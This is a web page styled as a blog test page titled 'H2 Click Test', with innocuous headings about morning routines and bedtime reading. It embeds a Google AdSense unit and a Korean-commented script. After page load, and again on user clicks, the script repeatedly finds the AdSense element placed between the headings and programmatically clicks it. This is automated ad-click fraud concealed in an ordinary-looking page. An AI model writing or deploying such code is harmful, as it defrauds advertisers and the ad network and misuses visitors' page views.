---
title: "H2 Click Test"
date: "2024-03-15"
description: "H2 element click test page"
---

## The Importance of Morning Routines {#the-importance-of-morning-routines}

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1279348640476088"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block"
     data-ad-format="fluid"
     data-ad-layout-key="-6t+ed+2i-1n-4w"
     data-ad-client="ca-pub-1279348640476088"
     data-ad-slot="6150167225"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>

## Benefits of Reading Before Sleep {#benefits-of-reading-before-sleep}

<div id="test-button" style="background: red; color: white; padding: 10px; text-align: center; cursor: pointer; margin: 20px 0;" onclick="alert('테스트 버튼이 클릭되었습니다!')">테스트 버튼 - 클릭해보세요</div>

<script>
// 두 h2 요소 사이의 정가운데 클릭 함수
function clickBetweenH2s() {
    try {
        console.log('두 H2 사이 클릭 함수 실행됨');
        
        const allH2s = document.querySelectorAll('h2');
        console.log('찾은 h2 요소 개수:', allH2s.length);
        
        if (allH2s.length >= 2) {
            const firstH2 = allH2s[0];
            const secondH2 = allH2s[1];
            
            const firstRect = firstH2.getBoundingClientRect();
            const secondRect = secondH2.getBoundingClientRect();
            
            console.log('첫 번째 H2 위치:', firstRect);
            console.log('두 번째 H2 위치:', secondRect);
            
            // 더 정확한 중심점 계산 - 첫 번째 h2의 하단과 두 번째 h2의 상단 사이
            const centerX = window.innerWidth / 2; // 화면 가로 중앙
            const centerY = firstRect.bottom + (secondRect.top - firstRect.bottom) / 2;
            
            console.log('두 H2 사이 중심 좌표:', centerX, centerY);
            
            // 여러 위치에서 시도
            const positions = [
                {x: centerX, y: centerY},
                {x: centerX - 50, y: centerY},
                {x: centerX + 50, y: centerY},
                {x: centerX, y: centerY - 20},
                {x: centerX, y: centerY + 20}
            ];
            
            for (let pos of positions) {
                const targetElement = document.elementFromPoint(pos.x, pos.y);
                console.log(`위치 (${pos.x}, ${pos.y})에서 찾은 요소:`, targetElement);
                
                // 테스트 버튼이나 다른 요소 클릭 시도
                if (targetElement) {
                    console.log('요소 클릭 시도:', targetElement.tagName, targetElement.className, targetElement.id);
                    
                    // 테스트 버튼 우선 클릭
                    if (targetElement.id === 'test-button' || targetElement.closest('#test-button')) {
                        console.log('테스트 버튼 클릭!');
                        targetElement.click();
                        break;
                    }
                    
                    // AdSense 또는 다른 요소 클릭
                    if (targetElement.classList.contains('adsbygoogle') || 
                        targetElement.tagName === 'INS' ||
                        targetElement.closest('.adsbygoogle')) {
                        console.log('AdSense 요소 클릭 시도:', targetElement);
                        targetElement.click();
                        break;
                    }
                    
                    // 일반 요소도 클릭 시도
                    if (targetElement.tagName !== 'HTML' && targetElement.tagName !== 'BODY') {
                        console.log('일반 요소 클릭 시도:', targetElement);
                        targetElement.click();
                        break;
                    }
                }
            }
        }
    } catch (e) {
        console.log('클릭 함수 오류:', e);
    }
}

// 실행 횟수 제한
let clickCount = 0;
const maxClicks = 5;

function executeClick() {
    if (clickCount < maxClicks) {
        clickCount++;
        clickBetweenH2s();
    }
}

// 페이지 로딩 후 실행
window.addEventListener('load', function() {
    console.log('페이지 로드 완료');
    // AdSense 광고가 로드될 시간을 충분히 기다림
    setTimeout(executeClick, 3000);
    
    // 추가 시도들
    setTimeout(executeClick, 5000);
    setTimeout(executeClick, 7000);
});

// 사용자 클릭 시 실행
document.addEventListener('click', function() {
    if (clickCount < maxClicks) {
        setTimeout(executeClick, 100);
    }
});
</script>

<style>
h2 {
    margin: 50px 0;
    padding: 20px;
    background: #f0f0f0;
}
</style>
